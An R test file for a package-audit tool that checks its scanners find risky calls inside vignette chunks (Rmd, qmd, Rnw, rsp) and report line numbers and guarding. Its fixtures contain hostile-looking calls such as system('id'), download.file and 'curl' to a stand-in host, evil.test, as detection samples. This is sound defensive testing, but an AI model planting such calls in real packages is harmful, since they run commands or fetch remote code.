rules <- load_rules()

# Rmd / qmd --------------------------------------------------------------------

rmd_pkg <- function(name, lines) {
  make_pkg(files = setNames(list(lines), file.path("vignettes", name)))
}

test_that("the Rmd extractor emits a segment per chunk, tagged by its engine", {
  pkg <- rmd_pkg("v.Rmd", c(
    "---", "title: V", "---",
    "```{r}", "system('id')", "```",
    "```{bash}", "curl https://www.evil.test/x", "```",
    "```{ojs}", "notAnEngineWeHandle = 1", "```"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  # The R chunk is parsed, the bash chunk is matched, and the ojs chunk falls
  # through to the default analyser: no findings, and no error either.
  expect_equal(res$patterns$rule, "system")
  expect_equal(res$matches$rule,  "curl")
  expect_equal(nrow(res$errors),  0L)
})

test_that("a vignette finding points at its line in the source file", {
  pkg <- rmd_pkg("v.Rmd", c("---", "title: V", "---", "", "```{r}",
                            "x <- 1", "system('id')", "```"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$patterns$line_number, 7L)
  expect_equal(res$patterns$code_context, "vignettes")
  expect_true(res$patterns$at_build)
  expect_true(res$patterns$at_check)
  expect_false(res$patterns$at_install_src)
})

test_that("an eval=FALSE chunk is scanned and marked guarded", {
  pkg <- rmd_pkg("v.Rmd", c("---", "title: V", "---",
                            "```{r, eval=FALSE}", "system('id')", "```",
                            "```{r}", "system('id')", "```"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_setequal(res$patterns$line_number, c(5L, 8L))
  expect_true(res$patterns$guarded[res$patterns$line_number == 5L])
  expect_false(res$patterns$guarded[res$patterns$line_number == 8L])
})

test_that("qmd is read by the Rmd extractor it inherits from", {
  pkg <- rmd_pkg("v.qmd", c("---", "title: V", "---",
                            "```{r}", "system('id')", "```"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$patterns$rule, "system")
  expect_equal(res$patterns$file_context, "vignettes/v.qmd")
})

test_that("an unterminated chunk is read to the end rather than dropped", {
  pkg <- rmd_pkg("v.Rmd", c("---", "title: V", "---", "```{r}", "system('id')"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  expect_equal(audit_package(pkg, rules)$patterns$rule, "system")
})

test_that("prose outside a chunk is not scanned", {
  pkg <- rmd_pkg("v.Rmd", c("---", "title: V", "---",
                            "Write system('id') in a chunk to run it."))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  expect_equal(nrow(audit_package(pkg, rules)$patterns), 0L)
})

# Rnw --------------------------------------------------------------------------

test_that("the Rnw extractor reads <<>>= chunks and inline \\Sexpr", {
  pkg <- rmd_pkg("v.Rnw", c(
    "\\documentclass{article}",              # 1
    "\\begin{document}",                     # 2
    "<<setup>>=",                            # 3
    "system('id')",                          # 4
    "@",                                     # 5
    "Inline \\Sexpr{download.file(u, t)} here.",  # 6
    "\\end{document}"                        # 7
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_setequal(res$patterns$rule, c("system", "download_file"))
  expect_setequal(res$patterns$line_number, c(4L, 6L))
  expect_true(all(res$patterns$code_context == "vignettes"))
})

test_that("an Rnw chunk marked eval=FALSE is guarded", {
  pkg <- rmd_pkg("v.Rnw", c("\\begin{document}", "<<a, eval=FALSE>>=",
                            "system('id')", "@", "\\end{document}"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  expect_true(audit_package(pkg, rules)$patterns$guarded)
})

test_that("LaTeX outside a chunk is not scanned", {
  pkg <- rmd_pkg("v.Rnw", c("\\documentclass{article}",
                            "\\begin{document}",
                            "Do not call system('id') at home.",
                            "\\end{document}"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  expect_equal(nrow(audit_package(pkg, rules)$patterns), 0L)
})

# rsp --------------------------------------------------------------------------
# Syntax taken from real vignettes in the CRAN snapshot: R.rsp's own
# example.txt.rsp and babel's babel.tex.rsp.

test_that("the rsp extractor reads <% %> and <%= %>, skipping directives", {
  pkg <- rmd_pkg("v.md.rsp", c(
    '<%@meta title="Example"%>',                    # 1 directive, not R
    'Title: <%@meta name="title"%>',                # 2 directive, not R
    'Counting:<% system("id") %>',                  # 3 statement
    ' <%=download.file(u, t)-%>',                   # 4 expression, trim marker
    '<%-- system("commented") --%>',                # 5 comment, not R
    'Plain text mentioning system("id") inline.'    # 6 output, not R
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_setequal(res$patterns$rule, c("system", "download_file"))
  expect_setequal(res$patterns$line_number, c(3L, 4L))
  expect_true(all(res$patterns$code_context == "vignettes"))
  expect_true(all(res$patterns$at_build & res$patterns$at_check))
})

test_that("an rsp region spanning lines stays aligned to the source", {
  pkg <- rmd_pkg("v.tex.rsp", c(
    "\\begin{verbatim}<%=withCapture({",   # 1
    "  system('id')",                       # 2
    "})%>\\end{verbatim}"                   # 3
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  expect_equal(audit_package(pkg, rules)$patterns$line_number, 2L)
})

test_that("an rsp file with no code yields no segment and no error", {
  pkg <- rmd_pkg("v.md.rsp", c('<%@meta title="T"%>', "Just prose."))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$patterns), 0L)
  expect_equal(nrow(res$errors),   0L)
})

test_that("an unterminated rsp region is read to the end rather than dropped", {
  pkg <- rmd_pkg("v.md.rsp", c("Text", "<% system('id')"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  expect_equal(audit_package(pkg, rules)$patterns$line_number, 2L)
})

# Regressions from the CRAN snapshot. Each of these cost coverage on a real
# vignette: a directive whose quoted content contains "<%" spliced itself into
# the code; two regions sharing a line concatenated into unparseable R; and the
# "<%%" escape and "<%:" echo marker were read as code and as text respectively.
test_that("a directive's quoted content is not spliced into the code", {
  pkg <- rmd_pkg("v.md.rsp", c(
    '<%@meta language="R-vignette" content="---------',   # 1
    'DIRECTIVES FOR R:  <% not code %>',                   # 2 still the content
    '"%>',                                                 # 3 closes it
    '<% system("id") %>'                                   # 4 real code
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$patterns$line_number, 4L)
  expect_equal(nrow(res$errors), 0L)
})

test_that("two regions on one line are separated so the result parses", {
  pkg <- rmd_pkg("v.tex.rsp", c("v<%=system('a')%> by <%=system('b')%>"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$patterns), 2L)
  expect_equal(nrow(res$errors),   0L)
})

test_that("the <%% escape is not code and the <%: marker is stripped", {
  pkg <- rmd_pkg("v.md.rsp", c(
    '<%%@meta name="literal"%>',   # 1 escaped delimiter, not code
    '<%:',                          # 2 echo marker
    'system("id")',                 # 3
    '%>'                            # 4
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$patterns$line_number, 3L)
  expect_equal(nrow(res$errors), 0L)
})

test_that("a Pandoc attribute block is displayed code, not a chunk", {
  # ```{.r} marks a block for syntax highlighting in the rendered page; its
  # contents are printed, not run. Treating it as a chunk invented a segment in
  # a language called ".r" and reported it as code pkgaudit had not examined.
  pkg <- make_pkg(files = list("vignettes/intro.Rmd" = c(
    "---", "title: x", "---", "",
    "```{r}", "y <- 1", "```", "",
    "Here is what that prints:", "",
    "```{.r}", "getOption(\"x\")", "```"
  )))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  cv <- audit_package(pkg, rules)$coverage
  rows <- cv[cv$file_context == "vignettes/intro.Rmd", ]
  expect_equal(nrow(rows), 1L)
  expect_equal(rows$status, "parsed")
})
